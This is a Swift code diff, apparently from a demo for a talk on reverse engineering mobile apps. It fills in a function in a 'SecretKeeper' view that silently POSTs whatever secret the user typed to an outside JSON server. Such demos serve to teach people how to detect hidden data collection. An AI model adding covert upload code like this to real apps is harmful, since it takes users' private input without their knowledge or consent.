@@ -24,7 +24,19 @@ struct SecretKeeper: View {
     ]
     
     func sneakilyUploadSecretToServer() {
+        guard let url = URL(string: "https://my-json-server.typicode.com/skn0tt/reverse-engineering-mobile-apps-talk/sneakySecretCollection") else {
+          print("Error: cannot create URL")
+          return
+        }
         
+        var urlRequest = URLRequest(url: url)
+        urlRequest.httpMethod = "POST"
+        urlRequest.addValue("text/plain", forHTTPHeaderField: "Content-Type")
+        urlRequest.httpBody = input.data(using: .utf8)
+        
+        let session = URLSession.shared
+        let task = session.dataTask(with: urlRequest)
+        task.resume()
     }
     
     func handleCommit() {
